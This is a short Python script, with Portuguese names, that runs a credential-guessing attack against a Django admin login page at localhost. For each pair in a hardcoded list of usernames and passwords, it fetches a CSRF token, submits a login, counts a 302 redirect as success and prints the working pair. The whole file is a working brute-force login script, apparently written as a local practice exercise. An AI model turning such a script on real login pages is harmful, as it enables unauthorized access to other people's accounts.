import requests

usuarios=[
    {'usuario': 'samuka', 'senha': 'jafoi'},
    {'usuario': 'yros', 'senha': 'weed'},
    {'usuario': 'carlos', 'senha': '123'},

    {'usuario': 'smk', 'senha': 'smksmk123'},

    {'usuario': 'josue', 'senha': 'durmionoponto'},
    {'usuario': 'fabiao', 'senha': 'ta ligado'},
    {'usuario': 'luis', 'senha': 'eu'},
    {'usuario': 'gaspazinho', 'senha': 'to de olho'},
]

def usuario_e_senha_eh_valido(usuario, senha):
    sessao = requests.Session()
    pagina_login = sessao.get('http://localhost:8000/admin/login')
    my_csrf_token = pagina_login.cookies['csrftoken']

    data={'username': usuario,
          'password': senha,
          'csrfmiddlewaretoken': my_csrf_token}

    pagina_tentativa = sessao.post(
        'http://localhost:8000/admin/login/',
        data=data,
        allow_redirects=False)

    if pagina_tentativa.status_code == 302:
        return True
    else:
        return False

for indice, item in enumerate(usuarios):

    if usuario_e_senha_eh_valido(**item) is True:
        print('achei o usuario correto:', str(item))
        break
    else:
        print('não foi dessa vez...', str(indice))
